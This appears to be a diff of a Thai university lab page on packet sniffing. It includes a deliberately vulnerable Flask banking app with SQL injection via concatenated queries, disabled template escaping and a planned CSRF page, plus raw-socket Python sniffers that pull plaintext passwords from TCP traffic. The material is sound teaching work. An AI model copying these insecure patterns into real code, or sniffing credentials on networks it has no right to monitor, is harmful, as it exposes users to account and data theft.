@@ -1,17 +1,1596 @@
 ---
-title: Lab3 - Packet Sniffing
+title: Lab3 - Sniffing
 lastUpdated: 2024-12-21
-draft: true
+draft: false
 ---
-
+import { Image } from 'astro:assets';
 import {
   Steps,
   Card,
   Tabs,
   TabItem,
   LinkButton,
+  FileTree
 } from "@astrojs/starlight/components";
+import im1 from '../../../assets/images/lab3/new_vm.png';
 
 <LinkButton href={"/int4101/print/lab3"} icon="seti:pdf" target={"_blank"}>
   Print
 </LinkButton>
+
+## Download Ubuntu
+
+<Steps>
+  1. Download Ubuntu 24.04.1 LTS :
+  [https://ubuntu.com/download/desktop/thank-you?version=24.04.1\&architecture=amd64\&lts=true](https://ubuntu.com/download/desktop/thank-you?version=24.04.1&architecture=amd64&lts=true)
+  2. ตรวจสอบค่า sum ของ ISO File ใน Powershell:
+</Steps>
+
+```ps title="Powershell - Check SUM SHA256" wrap
+Get-FileHash C:\Users\xxxx\Downloads\ubuntu-24.04.1-desktop-amd64.iso -Algorithm SHA256 | Format-List
+```
+
+:::caution[ค่า sum ควรมีค่าเท่ากับ]
+**C2E6F4DC37AC944E2ED507F87C6188DD4D3179BF4A3F9E110D3C88D1F3294BDC**
+:::
+
+## Install Ubuntu
+<Steps>
+
+  3. ติดตั้ง Ubuntu 24.04.1 LTS บท VirtualBox <Image src={im1} alt="New VM" loading="eager" /> 
+  4. ตรง Name ใส่ Ubuntu 24.04.1 ![New VM Ubuntu](../../../assets/images/lab3/new_vm_ubuntu.png) 
+  5. ตรง Folder ก็ตามค่าเริ่มต้นไป 
+  6. ตรง ISO Image กดปุ่ม Other ![SelectISO](../../../assets/images/lab3/select_iso.png) 
+  7. หาไฟล์ ISO ที่ Download มา ![Open ISO](../../../assets/images/lab3/open_iso.png) 
+  8. แล้วกด Open 
+  9. ติ๊กถูก Skip Unattended Installation ![Skip Unattended](../../../assets/images/lab3/setup_ubuntu_skip_unattended.png)
+  10. ตรง Hardware เปลี่ยน Base memory เป็น 4096 mb ![Ram 4096mb](../../../assets/images/lab3/memory_4gb.png)
+      :::danger[ระวัง]
+      minimum requirements ของ Ubuntu 24.04.1 คือ 4GB ถ้าตั้งน้อยกว่านั้นตอนติดตั้งจะค้างได้
+      :::
+  11. กดปุ่ม Finish แล้ว Virtual Box จะรันหน้าต่างขึ้นมา
+  12. กด Enter เลือก \*Try or Install Ubuntu ![BootVM](../../../assets/images/lab3/boot_vm.png) 
+  13. จะโหลด Ubuntu ขึ้นมาดังรูป ![Setup Ubuntu](../../../assets/images/lab3/setup_ubuntu.png) 
+  14. ระบบจะติดตั้ง Ubuntu กด Next ![Setup Ubuntu2](../../../assets/images/lab3/setup_ubuntu2.png) 
+  15. กด Next ![Setup Ubuntu3](../../../assets/images/lab3/setup_ubuntu3.png) 
+  16. กด Next ![Setup Ubuntu4](../../../assets/images/lab3/setup_ubuntu4.png) 
+  17. กด Next ![Setup Ubuntu5](../../../assets/images/lab3/setup_ubuntu5.png) 
+  18. กด Next ![Setup Ubuntu6](../../../assets/images/lab3/setup_ubuntu6.png) 
+  19. กด Next ![Setup Ubuntu7](../../../assets/images/lab3/setup_ubuntu7.png) 
+  20. กด Next ![Setup Ubuntu8](../../../assets/images/lab3/setup_ubuntu8.png) 
+  21. กด Next ![Setup Ubuntu9](../../../assets/images/lab3/setup_ubuntu9.png) 
+  22. ตรง Your name ใสชื่อตัวเรา และตรง Password ให้ตั้งค่าตามที่เราต้องการ แล้วกด Next ![Setup Ubuntu10](../../../assets/images/lab3/setup_ubuntu10.png) 
+  23. กด Next ![Setup Ubuntu11](../../../assets/images/lab3/setup_ubuntu11.png) 
+  24. กด Install ![Setup Ubuntu12](../../../assets/images/lab3/setup_ubuntu12.png) 
+  25. ระบบจะติดตั้ง Ubuntu ![Setup Ubuntu13](../../../assets/images/lab3/setup_ubuntu13.png) 
+  26. ระบบจะให้เรา Reboot
+  27. Login เข้ามาจะเจอหน้า Welcome ให้กด Next ไปเรื่อยๆ ![Welcome Ubuntu](../../../assets/images/lab3/welcome_ubuntu.png)
+  28. ให้กด Next ![Welcome Ubuntu](../../../assets/images/lab3/welcome_ubuntu2.png)
+  29. ให้กด Next ![Welcome Ubuntu](../../../assets/images/lab3/welcome_ubuntu3.png)
+  30. ให้กด Finish ![Welcome Ubuntu](../../../assets/images/lab3/welcome_ubuntu4.png)
+  31. กด Shutdown VM ออกมาก่อนแล้วไปที่ Settings ![Settings VM](../../../assets/images/lab3/vm_settings.png)
+  32. อย่าลืมเปลี่ยน Network ให้เป็น Bridge Mode ![Bridge Mode](../../../assets/images/lab3/network_bridge_mode.png)
+</Steps>
+
+## Install VSCode
+
+<Steps>
+1. ไปที่ [VSCode Website](https://code.visualstudio.com)
+2. กด Download VSCode เลือก .deb ![VSCode DEB](../../../assets/images/lab3/vscode_website.png)
+3. รอโหลด VSCode ![Download VSCode](../../../assets/images/lab3/download_vscode.png)
+4. Open File และ Install ![Install VSCode](../../../assets/images/lab3/install_vscode.png)
+5. Open VSCode ![Open VSCode](../../../assets/images/lab3/open_vscode.png)
+6. Install VSCode Extension ![VSCode Python Extension](../../../assets/images/lab3/vscode_python_extension.png)
+</Steps>
+
+## Install Curl
+<Card title='Install Curl'>
+
+```bash
+sudo apt install curl
+```
+หลังจากนั้นกด <kbd> y </kbd> + <kbd>Enter</kbd>
+![Install Python3](../../../assets/images/lab3/install_curl.png)
+</Card>
+## Install Python
+จะทำการติดตั้งเครื่องมือต่างๆ ดังนี้
+<Steps>
+1. Python3
+2. Scapy
+3. VENV
+</Steps>
+### Install python3
+<Card title='Install Python3'>
+```bash
+sudo apt install python3
+```
+หลังจากนั้นกด <kbd> y </kbd> + <kbd>Enter</kbd>
+![Install Python3](../../../assets/images/lab3/install_python3.png)
+</Card>
+### Install python3-scapy
+<Card title='Install Scapy'>
+
+```bash
+sudo apt install python3-scapy
+```
+
+หลังจากนั้นกด <kbd> y </kbd> + <kbd>Enter</kbd>
+
+![Python VENV](../../../assets/images/lab3/install_scapy.png)
+
+หลังจากนั้นพิมพ์ <kbd>scapy</kbd> + <kbd>Enter</kbd> เพื่อดูว่าได้ติดตั้งแล้ว
+
+```bash
+scapy
+```
+
+![Python Scapy](../../../assets/images/lab3/check_scapy_install.png)
+
+</Card>
+### Install python3-venv
+<Card title='Install VENV'>
+
+```bash
+sudo apt install python3-venv
+```
+
+หลังจากนั้นกด <kbd> y </kbd> + <kbd>Enter</kbd>
+
+![Python VENV](../../../assets/images/lab3/install_python_venv.png)
+
+</Card>
+
+## Install Flask
+
+<Card title='Install Flask'>
+
+ลำดับโครงสร้าง Folder สำหรับ Flask
+
+<FileTree>
+- labs
+    - .venv/ เก็บ module ที่ติดตั้ง
+    - lab3
+        - backend/ เก็บ web server
+            - templates/ เก็บ html template
+                - base.html
+                - index.html
+                - login.html
+                - accounts.html
+            - static เก็บ static file
+                - css/
+                - js/
+            - hackers
+                - index.html สร้างหน้าหลอก สำหรับโจมตี CSRF
+            - main.py
+            - cert.pem สร้างจาก openssl
+            - key.pem สร้างจาก openssl
+            - db.sqlite ไฟล์ฐานข้อมูล
+
+</FileTree>
+
+
+<Steps>
+
+1. สร้าง virtual environment เพื่อ install Flask โดยใช้ venv
+
+    ```bash
+        python3 -m venv .venv
+    ```
+
+2. จะได้ โฟลเดอร์ .venv ขึ้นมา ซึ่งจะถูกซ่อนอยู่
+
+    :::tip
+
+        โฟลเดอร์ที่มี `.` นำจะซ่อนอยู่ ต้องใช้คำสั่ง
+
+        ```bash
+            ls -al
+        ```
+        จึงจะเห็น
+    :::
+
+3. ทำการ activate virutal environment
+    ```bash
+    source .venv/bin/activate
+    ```
+
+4. Install Flask
+
+    ```bash
+    pip install flask
+    ```
+
+5. เมื่อติดตั้ง Flask เสร็จแล้ว ให้เราสร้างไฟล์ `main.py`
+
+    ```py
+    from flask import Flask, render_template, request, Response, redirect, url_for, g
+    from flask_login import (
+        LoginManager,
+        UserMixin,
+        current_user,
+        login_required,
+        login_user,
+        logout_user,
+    )
+    import sqlite3
+
+    app = Flask(__name__, static_url_path='', static_folder='static', template_folder='templates')
+    app.config.update(SECRET_KEY="secret_sauce")
+
+
+    DATABASE = 'db.sqlite'
+
+    def get_db():
+        db = getattr(g, '_database', None)
+        if db is None:
+            db = g._database = sqlite3.connect(DATABASE)
+            db.row_factory = sqlite3.Row
+        return db
+
+    @app.teardown_appcontext
+    def close_connection(exception):
+        db = getattr(g, '_database', None)
+        if db is not None:
+            db.close()
+
+    login_manager = LoginManager()
+    login_manager.init_app(app)
+
+
+    # database
+    users = [
+    ]
+
+    transactions = [
+    ]
+
+    def authen(username, password):
+        c = get_db().cursor()
+        sql = "SELECT * FROM users WHERE username = '"+username+"' AND password = '"+password+"'" 
+        c.execute(sql)
+        return c.fetchone()
+
+    def get_users():
+        c = get_db().cursor()
+        c.execute('SELECT * FROM users')
+        return c.fetchall()
+
+    def update_user_balance(id, balance):
+        c = get_db()
+        c.execute("UPDATE users SET balance = %s WHERE id = %s" % (balance, id))
+        c.commit()
+
+    class User(UserMixin):
+        ...
+
+
+    def get_user(user_id: int):
+        users = get_users()
+        for user in users:
+            try:
+                if int(user["id"]) == int(user_id):
+                    return user
+            except:
+                return None
+        return None
+
+
+    @login_manager.user_loader
+    def user_loader(id: int):
+        user = get_user(id)
+        if user:
+            user_model = User()
+            user_model.id = user["id"]
+            return user_model
+        return None
+
+
+    @app.errorhandler(401)
+    def unauthorized(error):
+        return Response("Not authorized"), 401
+
+
+    @app.route("/")
+    def index():
+        return render_template('index.html')
+
+    def valid_login(username, password):
+        isValid = username != '' and password != ''
+        return isValid
+
+    @app.route("/reset_balance")
+    @login_required
+    def reset_balance():
+        update_user_balance(1, 2000)
+        update_user_balance(2, 0)
+        current_user.balance = 2000
+        return redirect(url_for("accounts"))
+
+    @app.route("/accounts", methods=["GET", "POST"])
+    @login_required
+    def accounts():
+        user = get_user(current_user.id)
+        if request.method == "POST":
+            try:
+                account = int(request.form.get("account"))
+                amount = int(request.form.get("amount"))
+            except:
+                account = request.form.get("account")
+                amount = request.form.get("amount")
+
+            transfer_to = get_user(account)
+
+            if isinstance(amount, int) and amount <= int(user["balance"]) and transfer_to and user:
+                amount_left = int(user["balance"])
+                amount_left -= amount
+                # user["balance"] = amount
+                update_user_balance(user["id"], amount_left)
+                transfer_amount_left = int(transfer_to["balance"])
+                transfer_amount_left += amount
+                # transfer_to["balance"] = transfer_amount_left
+                update_user_balance(transfer_to["id"], transfer_amount_left)
+                user = get_user(current_user.id)
+
+            transactions.append({'id':len(transactions),'amount':amount})
+
+
+        return render_template(
+            "accounts.html",
+            balance=user["balance"],
+            username=user["username"],
+            transactions=transactions
+        )
+
+
+    @app.route('/login', methods=['POST', 'GET'])
+    def login():
+        error = None
+        if request.method == "POST":
+            username = request.form.get("username")
+            password = request.form.get("password")
+
+            user = authen(username, password)
+
+            if user is None:
+                error = 'Invalid username/password'
+                return render_template("login.html", error=error)
+            else:
+                user_model = User()
+                user_model.id = user["id"]
+                login_user(user_model)
+                return redirect(url_for("accounts"))
+
+
+        if current_user.is_authenticated:
+            return redirect(url_for("accounts"))
+
+        return render_template("login.html")
+
+    @app.route("/logout")
+    @login_required
+    def logout():
+        logout_user()
+        return redirect(url_for("index"))
+
+
+    if __name__ == '__main__':
+        app.run(host='0.0.0.0',debug=True,port=5000)
+    ```
+
+6. สร้างไฟล์ `base.html` ในโฟลเดอร์ `templates`
+
+    ```html
+    // base.html
+    <!DOCTYPE html>
+    <html lang="en">
+
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Example Website</title>
+        <link href="https://cdn.jsdelivr.net/npm/daisyui@4.12.23/dist/full.min.css" rel="stylesheet" type="text/css" />
+        <script src="https://cdn.tailwindcss.com"></script>
+    </head>
+
+    <body>
+        {% block content %}{% endblock %}
+    </body>
+
+    </html>
+
+    ```
+
+7. สร้างไฟล์ `index.html` 
+
+    ```html
+    {% extends 'base.html' %}
+    {% block content %}
+        <!-- Hero -->
+        <div class="relative overflow-hidden">
+            <!-- Gradients -->
+            <div aria-hidden="true" class="flex absolute -top-96 start-1/2 transform -translate-x-1/2">
+                <div
+                    class="bg-gradient-to-r from-violet-300/50 to-purple-100 blur-3xl w-[25rem] h-[44rem] rotate-[-60deg] transform -translate-x-[10rem] dark:from-violet-900/50 dark:to-purple-900">
+                </div>
+                <div
+                    class="bg-gradient-to-tl from-blue-50 via-blue-100 to-blue-50 blur-3xl w-[90rem] h-[50rem] rounded-fulls origin-top-left -rotate-12 -translate-x-[15rem] dark:from-indigo-900/70 dark:via-indigo-900/70 dark:to-blue-900/70">
+                </div>
+            </div>
+            <!-- End Gradients -->
+
+            <div class="relative z-10">
+                <div class="max-w-[85rem] mx-auto px-4 sm:px-6 lg:px-8 py-10 lg:py-16">
+                    <div class="max-w-2xl text-center mx-auto">
+
+                        <!-- Title -->
+                        <div class="mt-5 max-w-2xl">
+                            <h1
+                                class="block font-semibold text-gray-800 text-4xl md:text-5xl lg:text-6xl dark:text-neutral-200">
+                                An Exmaple Flask Web App
+                            </h1>
+                        </div>
+                        <!-- End Title -->
+
+                        <div class="mt-5 max-w-3xl">
+                            <p class="text-lg text-gray-600 dark:text-neutral-400">A list of pages are below</p>
+                        </div>
+
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- End Hero -->
+
+        <div class="container mx-auto px-4 py-2">
+
+            <div class="text-4xl">An example</div>
+
+            <!-- Card Section -->
+            <div class="max-w-[85rem] px-4 py-10 sm:px-6 lg:px-8 lg:py-14 mx-auto">
+                <!-- Grid -->
+                <div class="grid sm:grid-cols-2 md:grid-cols-3 xl:grid-cols-4 gap-3 sm:gap-6">
+                    <!-- Card -->
+                    <a class="group flex flex-col bg-white border shadow-sm rounded-xl hover:shadow-md focus:outline-none focus:shadow-md transition dark:bg-neutral-900 dark:border-neutral-800"
+                        href="/login">
+                        <div class="p-4 md:p-5">
+                            <div class="flex justify-between items-center gap-x-3">
+                                <div class="grow">
+                                    <h3
+                                        class="group-hover:text-blue-600 font-semibold text-gray-800 dark:group-hover:text-neutral-400 dark:text-neutral-200">
+                                        Login
+                                    </h3>
+                                    <p class="text-sm text-gray-500 dark:text-neutral-500">
+                                        A login page
+                                    </p>
+                                </div>
+                                <div>
+                                    <svg class="shrink-0 size-5 text-gray-800 dark:text-neutral-200"
+                                        xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                                        stroke-linejoin="round">
+                                        <path d="m9 18 6-6-6-6" />
+                                    </svg>
+                                </div>
+                            </div>
+                        </div>
+                    </a>
+                    <!-- End Card -->
+
+                </div>
+                <!-- End Grid -->
+            </div>
+            <!-- End Card Section -->
+        </div>
+    {% endblock %}
+    ```
+
+8. สร้างไฟล์ `login.html`
+
+    ```html
+    // login.html
+    {% extends 'base.html' %}
+
+    {% block content %}
+    <div class="container mx-auto w-96">
+
+        <div class="mt-7 bg-white border border-gray-200 rounded-xl shadow-sm dark:bg-neutral-900 dark:border-neutral-700">
+            <div class="p-4 sm:p-7">
+                <div class="text-center">
+                    <h1 class="block text-2xl font-bold text-gray-800 dark:text-white">Sign in</h1>
+                </div>
+
+                <div class="mt-5">
+
+
+                    <!-- Form -->
+                    <form method="post" action="/login">
+                        <div class="grid gap-y-4">
+                            <!-- Form Group -->
+                            <div>
+                                <label for="username" class="block text-sm mb-2 dark:text-white">Usesrname</label>
+                                <div class="relative">
+                                    <input type="text" id="username" name="username"
+                                        class="py-3 px-4 block w-full border border-gray-200 rounded-lg text-sm focus:border-blue-500 focus:ring-blue-500 disabled:opacity-50 disabled:pointer-events-none dark:bg-neutral-900 dark:border-neutral-700 dark:text-neutral-400 dark:placeholder-neutral-500 dark:focus:ring-neutral-600"
+                                        required aria-describedby="email-error">
+                                    <div class="hidden absolute inset-y-0 end-0 pointer-events-none pe-3">
+                                        <svg class="size-5 text-red-500" width="16" height="16" fill="currentColor"
+                                            viewBox="0 0 16 16" aria-hidden="true">
+                                            <path
+                                                d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zM8 4a.905.905 0 0 0-.9.995l.35 3.507a.552.552 0 0 0 1.1 0l.35-3.507A.905.905 0 0 0 8 4zm.002 6a1 1 0 1 0 0 2 1 1 0 0 0 0-2z" />
+                                        </svg>
+                                    </div>
+                                </div>
+                                <p class="hidden text-xs text-red-600 mt-2" id="email-error">Please include a valid email
+                                    address so we can get back to you</p>
+                            </div>
+                            <!-- End Form Group -->
+
+                            <!-- Form Group -->
+                            <div>
+                                <div class="flex justify-between items-center">
+                                    <label for="password" class="block text-sm mb-2 dark:text-white">Password</label>
+                                </div>
+                                <div class="relative">
+                                    <input type="password" id="password" name="password"
+                                        class="py-3 px-4 block w-full border border-gray-200 rounded-lg text-sm focus:border-blue-500 focus:ring-blue-500 disabled:opacity-50 disabled:pointer-events-none dark:bg-neutral-900 dark:border-neutral-700 dark:text-neutral-400 dark:placeholder-neutral-500 dark:focus:ring-neutral-600"
+                                        required aria-describedby="password-error">
+                                    <div class="hidden absolute inset-y-0 end-0 pointer-events-none pe-3">
+                                        <svg class="size-5 text-red-500" width="16" height="16" fill="currentColor"
+                                            viewBox="0 0 16 16" aria-hidden="true">
+                                            <path
+                                                d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zM8 4a.905.905 0 0 0-.9.995l.35 3.507a.552.552 0 0 0 1.1 0l.35-3.507A.905.905 0 0 0 8 4zm.002 6a1 1 0 1 0 0 2 1 1 0 0 0 0-2z" />
+                                        </svg>
+                                    </div>
+                                </div>
+                                <p class="hidden text-xs text-red-600 mt-2" id="password-error">8+ characters required</p>
+                            </div>
+                            <!-- End Form Group -->
+
+                            <button type="submit"
+                                class="w-full py-3 px-4 inline-flex justify-center items-center gap-x-2 text-sm font-medium rounded-lg border border-transparent bg-blue-600 text-white hover:bg-blue-700 focus:outline-none focus:bg-blue-700 disabled:opacity-50 disabled:pointer-events-none">Sign
+                                in</button>
+
+                            <div class="text-red-500">{{error}}</div>
+                        </div>
+                    </form>
+                    <!-- End Form -->
+                </div>
+            </div>
+        </div>
+    </div>
+    {% endblock %}
+    ```
+
+9. สร้างไฟล์ `accounts.html`
+
+    ```html
+    {% extends 'base.html' %}
+
+    {% block content %}
+    {% autoescape false %}
+    <div class="container mx-auto">
+
+        <div class="flex w-full justify-between items-center h-16 bg-black text-white px-4">
+            <div class="flex gap-4 items-center">
+                <div class="text-2xl uppercase">Central bank account of</div>
+                <div class="text-xl italic text-amber-300">{{username}}</div>
+            </div>
+            <a class="uppercase hover:text-amber-300" href="/logout">logout</a>
+        </div>
+        <p class="text-2xl my-2">Balance: ${{balance}}</p>
+        <form class="px-4 py-2 my-2 border rounded-md max-w-fit" action="/accounts" method="POST" autocomplete="off">
+            <p class="my-2">Transfer Money</p>
+            <input class="border px-2 py-3" type="text" name="account" placeholder="accountid">
+            <input class="border px-2 py-3" type="text" name="amount" placeholder="amount">
+            <input class="border rounded-md px-4 py-3 bg-amber-300 text-black font-bold uppercase" type="submit"
+                value="Send">
+        </form>
+        <p class="text-2xl">All transactions:</p>
+        <table class="table">
+            <thead>
+                <tr>
+                    <th>ID</th>
+                    <th>AMOUNT</th>
+                </tr>
+            </thead>
+            <tbody>
+                {% for transaction in transactions %}
+                <tr>
+                    <td>{{ transaction.id }}</td>
+                    <td title={{transaction.amount}}>{{ transaction.amount }}</td>
+                </tr>
+                {% endfor %}
+            </tbody>
+        </table>
+    </div>
+    {% endautoescape %}
+    {% endblock %}
+    ```
+
+10. โครงสร้างฐานข้อมูล
+
+    ```sql
+    BEGIN TRANSACTION;
+    CREATE TABLE IF NOT EXISTS "users" (
+    	"id"	INTEGER,
+    	"username"	TEXT,
+    	"password"	TEXT,
+    	"balance"	NUMERIC,
+    	PRIMARY KEY("id" AUTOINCREMENT)
+    );
+    INSERT INTO "users" VALUES (1,'test','test',2000);
+    INSERT INTO "users" VALUES (2,'hacker','hacker',0);
+    COMMIT;
+
+    ```
+
+11. ทำการทดสอบรัน Flask ขึ้นมา 
+
+    ```bash
+    flask --app main run --host 0.0.0.0 --debug
+    ```
+
+    ซึ่งผลลัพธ์จะขึ้นดังนี้
+
+    ```bash
+    * Serving Flask app 'main'
+    * Debug mode: on
+      WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+    * Running on all addresses (0.0.0.0)
+    * Running on http://127.0.0.1:5000
+    * Running on http://192.168.96.155:5000
+      Press CTRL+C to quit
+    * Restarting with stat
+    * Debugger is active!
+    * Debugger PIN: 780-509-382
+    ```
+</Steps>
+
+
+
+</Card>
+
+## Packet Sniffer
+
+<Card title='Sniffing'>
+Sniffing is a process of monitoring and capturing all data packets passing through given network.
+
+![Packet Sniffer](../../../assets/images/lab3/packet_sniffer.svg)
+</Card>
+
+
+:::note
+โครงสร้างของ IP Header จะแบ่งได้ตามรูป
+
+![IP Header](../../../assets/images/lab3/ip_header.svg)
+
+:::
+
+```py {1} 
+header = struct.unpack('<BBHHHBBH4s4s', self.packet[0:20])
+        self.ver = header[0] >> 4   # Gets the 1st nibble
+        self.ihl = header[0] & 0xF  # Gets the 2nd nibble
+        self.tos = header[1]
+        self.len = header[2]
+        self.id = header[3]
+        self.off = header[4]
+        self.ttl = header[5]
+        self.pro = header[6]
+        self.sum = header[7]
+        self.src = header[8]
+        self.dst = header[9]
+```
+
+จากโค๊ด คำสั่ง unpack ของ struct จะแปลง struct ในภาษา C เป็น Python bytes object โดยดึงจาก Buffer ซึ่ง Header จะเป็นส่วนที่เราต้องการะจะอยู่ในส่วนของ 20 bytes แรก นั่นก็คือ `self.packet[0:20]`
+
+ซึ่งจะดึงออกมาได้จะต้องจัด Format ของ bytes ให้เป็น  `<BBHHHBBH4s4s` ซึ่ง `<` จะแทน **Littele Endian**
+
+ส่วน **B, H, s** จะแทนขนาดของชนิดตัวแปรและขนาดดังตารางต่อไปนี้
+
+
+|Format|C Type |Python Type|ขนาด|
+|:---:|:---:|:---:|:---:|
+| **`B`**   | unsigned char | integer | 1 |
+| **`H`**   | unsigned short | integer | 2 |
+| **`s`**   | char[] | bytes | 1 | 
+
+
+ดังนั้น ```BBHHHBBH4s4s``` = (1 + 1 + 2 + 2 + 2 + 1 + 1 + 2 + (4 x 1) + (4 x 1)) = 20 bytes
+
+### Sniff ICMP Protocol
+
+<Card title='Example 1'>
+
+ตัวอย่างนี้จะทำการ Sniff Protocol ICMP เมื่อมีการใช้คำสั่ง PING ตัวโปรแกรมจะทำการแยก ตัว Packet ออกมา
+
+:::caution
+
+:::
+
+```py
+// sniff.py
+#!/usr/bin/env python3
+
+import ipaddress
+import socket
+import struct
+import sys
+import argparse
+
+
+parser = argparse.ArgumentParser(description='Network packet sniffer')
+parser.add_argument('--ip', help='IP address to sniff on', required=True)
+opts = parser.parse_args()
+
+class Packet:
+    def __init__(self, data):
+        """
+        Extracts IP header fields except the options field. Only the first 20
+        bytes is processed since it is the size of standard IP header.
+        """
+        self.packet = data
+        header = struct.unpack('<BBHHHBBH4s4s', self.packet[0:20])
+        self.ver = header[0] >> 4   # Gets the 1st nibble
+        self.ihl = header[0] & 0xF  # Gets the 2nd nibble
+        self.tos = header[1]
+        self.len = header[2]
+        self.id = header[3]
+        self.off = header[4]
+        self.ttl = header[5]
+        self.pro = header[6]
+        self.sum = header[7]
+        self.src = header[8]
+        self.dst = header[9]
+
+        # The resulting SRC and DST ipaddress are not in decimal dotted
+        # noation (ie 17216177132), so we need to convert it (ie 172.16.177.132)
+        self.src_addr = ipaddress.ip_address(self.src)
+        self.dst_addr = ipaddress.ip_address(self.dst)
+
+        # You can see full list of protocol numbers here:
+        # https://en.wikipedia.org/wiki/List_of_IP_protocol_numbers
+        self.protocol_map = {1: "ICMP", 6: "TCP", 17: "UDP"}
+        try:
+            self.protocol = self.protocol_map[self.pro]
+        except Exception as e:
+            print(f'{e} No protocol for {self.pro}')
+            self.protocol = str(self.pro)
+
+    def print_header_short(self):
+        """
+        Prints only important information from IP header such as protocol, src
+        IP address and dst IP addresss.
+        """
+        print(f'Protocol: {self.protocol} {self.src_addr} -> {self.dst_addr}')
+
+
+def sniff(host):
+    socket_protocol = socket.IPPROTO_ICMP
+    sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW,
+                            socket_protocol)
+    sniffer.bind((host, 0))
+    # Let's include the iP header headers
+    sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+
+    try:
+        while True:
+            raw_data = sniffer.recv(65535)
+            packet = Packet(raw_data)
+            packet.print_header_short()
+    except KeyboardInterrupt:
+        sys.exit(1)
+
+if __name__ == '__main__':
+    sniff(opts.ip)
+```
+
+:::tip
+
+โค๊ดด้านล่างมีไว้เพื่อให้รัน bash script ได้โดยไม่ต้องใช้ python3 ในการ execute python script
+
+```python
+#!/usr/bin/env python3
+```
+
+ทำการตั้งค่า permission ให้ python script นี้รันได้
+
+```bash
+chmod +x script.py
+```
+
+ด้วยคำสั่งนี้
+
+```bash
+./script.py
+```
+
+:::
+
+
+ทำการ ping ไปยัง VM ของ Ubuntu โดยการหา IP ของ Ubuntu
+
+```bash
+ip addr
+```
+
+![ip addr command](../../../assets/images/lab3/ip_addr.png)
+
+หลังจากนั้นทำการ ping จาก PowerShell ใน Windows
+
+```ps
+ping 192.168.96.155
+```
+
+![Ping](../../../assets/images/lab3/ping_icmp.png)
+
+แล้วทำการรันโปรแกรมเพื่อดัก Protocol ICMP ที่เกิดจากการใช้คำสั่ง ping
+
+```bash
+sudo ./sniff_icmp.py --ip 192.168.96.155
+```
+
+**OUTPUT**
+
+![Sniff ICMP](../../../assets/images/lab3/output_sniff_icmp.png)
+
+</Card>
+
+### Sniff TCP Protocol
+
+ตัวอย่างต่อไปนี้จะดัก protocol tcp เพื่อหา username กับ password
+
+<Card title='Example 2'>
+```py
+#!/usr/bin/env python3
+
+import ipaddress
+import socket
+import struct
+import sys
+import argparse
+import re
+
+
+parser = argparse.ArgumentParser(description='Network packet sniffer')
+parser.add_argument('--ip', help='IP address to sniff on', required=True)
+parser.add_argument('--proto', help='Protocol to sniff (icmp/tcp)',
+                    required=True)
+parser.add_argument('--data', help='Display data', action='store_true')
+opts = parser.parse_args()
+
+class Packet:
+    def __init__(self, data):
+        """
+        Extracts IP header fields except the options field. Only the first 20
+        bytes is processed since it is the size of standard IP header.
+        """
+        self.packet = data
+        header = struct.unpack('<BBHHHBBH4s4s', self.packet[0:20])
+        self.ver = header[0] >> 4   # Gets the 1st nibble
+        self.ihl = header[0] & 0xF  # Gets the 2nd nibble
+        self.tos = header[1]
+        self.len = header[2]
+        self.id = header[3]
+        self.off = header[4]
+        self.ttl = header[5]
+        self.pro = header[6]
+        self.sum = header[7]
+        self.src = header[8]
+        self.dst = header[9]
+
+        # The resulting SRC and DST ipaddress are not in decimal dotted
+        # noation (ie 17216177132), so we need to convert it (ie 172.16.177.132)
+        self.src_addr = ipaddress.ip_address(self.src)
+        self.dst_addr = ipaddress.ip_address(self.dst)
+
+        # You can see full list of protocol numbers here:
+        # https://en.wikipedia.org/wiki/List_of_IP_protocol_numbers
+        self.protocol_map = {1: "ICMP", 6: "TCP", 17: "UDP"}
+        try:
+            self.protocol = self.protocol_map[self.pro]
+        except Exception as e:
+            print(f'{e} No protocol for {self.pro}')
+            self.protocol = str(self.pro)
+
+    def print_header_short(self):
+        """
+        Prints only important information from IP header such as protocol, src
+        IP address and dst IP addresss.
+        """
+        print(f'Protocol: {self.protocol} {self.src_addr} -> {self.dst_addr}')
+
+    def print_data(self):
+        """
+        Displays packet data in human readable format
+        """
+        # IP header is the first 20 bytes. Anything beyond that should be the
+        # packet data so let's get it.
+        data = self.packet[20:]
+        print('*'*10 + 'ASCII START' + '*'*10)
+        for b in data:
+            if b < 128:
+                print(chr(b), end='')
+            else:
+                print('.', end='')
+        print('\n' + '*'*10 + 'ASCII END' + '*'*10)
+
+def sniff(host):
+    if opts.proto == 'tcp':
+        socket_protocol = socket.IPPROTO_TCP
+    else:
+        socket_protocol = socket.IPPROTO_ICMP
+    sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW,
+                            socket_protocol)
+    sniffer.bind((host, 0))
+    # Let's include the iP header headers
+    sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+
+    try:
+        while True:
+            raw_data = sniffer.recv(65535)
+            packet = Packet(raw_data)
+            packet.print_header_short()
+
+            if opts.data:
+                packet.print_data()
+    except KeyboardInterrupt:
+        sys.exit(1)
+
+if __name__ == '__main__':
+    sniff(opts.ip)
+```
+
+ทำการรัน Simple Server ของ Module ใน Python โดยเปิดพอร์ท 80
+
+```bash
+sudo python3 -m http.server 80
+```
+
+![Simple Server](../../../assets/images/lab3/python_simple_server.png)
+
+ใช้ CURL ส่งคำสั่ง POST ไปยัง Server โดยใช้ username คือ krit และ password คือ 1234 ไปยัง IP ของ Ubuntu
+
+```bash
+curl -L --interface enp0s3 -d 'username=krit&password=1234!' 192.168.96.155
+```
+
+**OUTPUT**
+
+![Sniff Username กับ Password](../../../assets/images/lab3/sniff_username_password.png)
+
+
+:::caution[คำถาม]
+
+1. จากโค๊ดด้านบน จะพิมพ์เฉพาะ username กับ password ออกมา
+:::
+</Card>
+
+
+### ใช้ Scapy ทำการ Sniff TCP
+
+อันนี้จะใช้ tools ที่ชื่อว่า Scapy ทำการ Sniff Packet ออกมา
+จากรูปด้านล่างจะใช้ Scapy ทำการ Sniff protocol icmp ออกมา
+![Scapy Sniff ICMP](../../../assets/images/lab3/sniff_target_ip.png)
